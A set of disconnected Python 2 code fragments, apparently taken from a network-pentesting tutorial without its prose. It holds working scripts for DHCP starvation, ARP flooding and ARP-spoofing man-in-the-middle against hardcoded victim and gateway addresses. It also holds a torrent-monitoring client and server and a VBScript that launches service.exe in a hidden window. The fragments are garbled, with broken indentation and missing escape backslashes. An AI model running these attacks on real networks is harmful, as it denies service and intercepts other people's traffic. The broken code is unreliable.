["```py\n      from scapy.all import *\n      import time\n      import socket\n      import struct\n```", "```py\n      s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, \n      socket.ntohs(0x0800))\n      i = 1\n```", "```py\n      while True:\n```", "```py\n    eth1 = Ether(src=RandMAC(),dst=\"ff:ff:ff:ff:ff:ff\")\n    ip1 = IP(src=\"img/0.0.0.0\",dst=\"255.255.255.255\")\n```", "```py\n    udp1= UDP(sport=68,dport=67)\n    bootp1= BOOTP(chaddr=RandString(12,'0123456789abcdef'))\n```", "```py\n    dhcp1 = DHCP(options=[(\"message-type\",\"discover\"),\"end\"])\n    dhcp2 = DHCP(options=[(\"message-type\",\"request\")])\n    dhcp_discover = eth1/ip1/udp1/bootp1/dhcp1\n    dhcp_discover[BOOTP].xid= 123456\n```", "```py\n    sendp(dhcp_discover)\n    pkt = s.recvfrom(2048)\n    num = pkt[0][14].encode('hex')\n    ip_length = (int(num) % 10) * 4\n    ip_last_range = 14 + ip_length\n    ipheader = pkt[0][14:ip_last_range]\n    ip_hdr = struct.unpack(\"!12s4s4s\",ipheader)\n    server_ip = socket.inet_ntoa(ip_hdr[1])\n    obtained_ip = socket.inet_ntoa(ip_hdr[2])\n\n```", "```py\n    print \"Obtained IP \",obtained_ip\n    print \"DHCP server IP \",server_ip\n    dhcp_request = eth1/ip1/udp1/bootp1/dhcp2\n    dhcp_request[BOOTP].xid= 123456\n    name='master'+str(i)\n\n    i =i+1\n    dhcp_request[DHCP].options.append((\"requested_addr\", obtained_ip))\n    dhcp_request[DHCP].options.append((\"server_id\", server_ip))\n    dhcp_request[DHCP].options.append((\"hostname\", name))\n    dhcp_request[DHCP].options.append((\"param_req_list\",\n    b'x01x1cx02x03x0fx06x77x0cx2cx2fx1ax79x2a'))\n    dhcp_request[DHCP].options.append((\"end\"))\n```", "```py\n    time.sleep(.5)\n    sendp(dhcp_request)\n```", "```py\nfrom scapy.all import *\nnum = int(raw_input(\"Enter the number of packets \"))\ninterface = raw_input(\"Enter the Interface \")\n\neth_pkt = Ether(src=RandMAC(),dst=\"ff:ff:ff:ff:ff:ff\")\n\narp_pkt=ARP(pdst='192.168.1.255',hwdst=\"ff:ff:ff:ff:ff:ff\")\n\ntry:\n  sendp(eth_pkt/arp_pkt,iface=interface,count =num, inter= .001)\n\nexcept : \n  print \"Destination Unreachable \"\n```", "```py\nimport socket\nimport struct\nimport binascii\ns = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))\ns.bind((\"eth0\",socket.htons(0x0800)))\n\nsor = 'x48x41x43x4bx45x52'\n\nvictmac ='x00x0Cx29x2Ex84x7A'\ngatemac = 'x00x50x56xC0x00x08'\ncode ='x08x06'\neth1 = victmac+sor+code #for victim\neth2 = gatemac+sor+code # for gateway\n\nhtype = 'x00x01'\nprotype = 'x08x00'\nhsize = 'x06'\npsize = 'x04'\nopcode = 'x00x02'\n\ngate_ip = '192.168.0.1'\nvictim_ip = '192.168.0.11' \ngip = socket.inet_aton ( gate_ip )\nvip = socket.inet_aton ( victim_ip )\n\narp_victim = eth1+htype+protype+hsize+psize+opcode+sor+gip+victmac+vip\narp_gateway= eth2+htype+protype+hsize+psize+opcode+sor+vip+gatemac+gip\n\nwhile 1:\n  s.send(arp_victim)\n  s.send(arp_gateway)\n```", "```py\n      import socket\n      import logging\n      import sys\n```", "```py\n      print \"Welcome, torrent dection program started\"\n      print \"Use only Ctrl+c to stop\"\n```", "```py\n      logger = logging.getLogger(\"torrent_logger\")\n      logger.setLevel(logging.INFO)\n      fh = logging.FileHandler(\"torrent_dection.log\")\n      formatter = logging.Formatter('%(asctime)s - %(name)s - %      \n      (levelname)s - %(message)s')\n      fh.setFormatter(formatter)\n      logger.addHandler(fh)\n      logger.info(\"Torrent detection program started\")\n```", "```py\n      prcess_client = []\n      host = \"192.168.0.128\"\n      port = 54321\n```", "```py\n      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n      s.bind((host,port))\n```", "```py\n      while True:\n        try:\n\n          data, addr = s.recvfrom(1024)\n          print \"\\a\\a\\a\\a\\a\\a\\a\"\n          if addr[0] not in prcess_client :\n            print data, addr[0]\n            line = str(data)+\" *** \"+addr[0]\n            logger.info(line)\n            line = \"\\n****************************\\n\"\n            logger.info(line)\n          prcess_client.append(addr[0])\n        except KeyboardInterrupt:\n          s.close()\n          sys.exit()\n\n        except:\n          pass\n```", "```py\n      import os\n      import re\n      import time\n      import socket\n      import getpass\n```", "```py\n      host = \"192.168.0.128\"\n      port = 54321\n```", "```py\n      while True:\n        try:\n          s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n          name =socket.gethostname()\n          user = getpass.getuser()\n```", "```py\n    response = os.popen('tasklist')\n    for line in response.readlines():\n      str1 = \"Torrent Identified on host \"+str(name)+\" User \"+str(user)\n      if re.search(\"torrent\", line.lower()):\n        s.sendto(str1,(host,port))\n        s.sendto(str1,(host,port))\n        s.sendto(str1,(host,port))\n        #s.send(\"\")\n        break\n\n          s.close()\n          time.sleep(30)\n        except :\n          pass\n```", "```py\nPython pyinstaller.py --onefile <file.py>\n```", "```py\n\nDim WinScriptHost\nSet WinScriptHost = CreateObject(\"WScript.Shell\")\nWinScriptHost.Run Chr(34) & \"%WINDIR%\\service.exe\" & Chr(34), 0\nSet WinScriptHost = Nothing\n```"]